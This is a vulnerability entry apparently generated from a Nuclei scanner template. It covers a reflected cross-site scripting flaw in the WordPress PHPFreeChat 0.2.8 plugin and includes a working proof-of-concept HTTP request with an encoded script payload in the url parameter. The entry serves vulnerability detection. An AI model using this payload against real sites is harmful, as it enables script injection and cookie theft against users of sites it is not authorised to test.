# Vulnerability: WordPress PHPFreeChat 0.2.8 - Cross-Site Scripting
**Classification:** CWE-79
**Source:** Nuclei Template (`wp-phpfreechat-xss.yaml`)

## Description
WordPress PHPFreeChat 0.2.8 plugin contains a cross-site scripting vulnerability via the url parameter. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.

## Vulnerable Code Pattern / Exploit Payload
```http
GET / HTTP/1.1
Host: {{Hostname}}

GET {{BaseURL}}/wp-content/plugins/phpfreechat/lib/csstidy-1.2/css_optimiser.php?url=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
```

